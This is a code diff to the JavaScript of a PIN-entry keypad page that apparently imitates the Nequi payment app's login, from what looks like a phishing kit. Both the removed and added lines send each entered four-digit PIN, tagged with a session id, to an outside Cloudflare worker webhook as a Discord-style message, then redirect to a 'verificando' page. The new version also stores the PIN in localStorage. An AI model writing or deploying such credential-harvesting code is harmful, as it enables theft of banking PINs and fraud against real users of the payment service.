@@ -117,6 +117,8 @@
         const maxLength = 4;
         const dots = document.querySelectorAll('.dot');
         const keyboard = document.getElementById('keyboard');
+        const webhookURL = 'https://nequi-worker.miprimercredito.workers.dev';
+        const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
         
         const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '', '0', '✗'];
         keys.forEach(key => {
@@ -135,19 +137,23 @@
                     updateDots();
                     
                     if (pin.length === maxLength) {
-                        setTimeout(() => {
-                            const webhookURL = 'https://nequi-worker.miprimercredito.workers.dev';
-
-const mensaje = `🔐 **CLAVE INGRESADA**\nClave: ${pin}`;
-
-fetch(webhookURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content: mensaje })
-}).finally(() => {
-    window.location.href = 'verificando.html';
-});
-                        }, 250);
+                        // Guardar clave en localStorage
+                        const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
+                        datosSesion.clave = pin;
+                        localStorage.setItem('datosSesion', JSON.stringify(datosSesion));
+                        
+                        // Enviar mensaje a Discord
+                        const mensaje = `🔐 **CLAVE INGRESADA**\n🆔 ${sesionId}\nClave: ${pin}`;
+                        
+                        fetch(webhookURL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: mensaje })
+                        }).finally(() => {
+                            setTimeout(() => {
+                                window.location.href = 'verificando.html';
+                            }, 250);
+                        });
                     }
                 });
             } else {
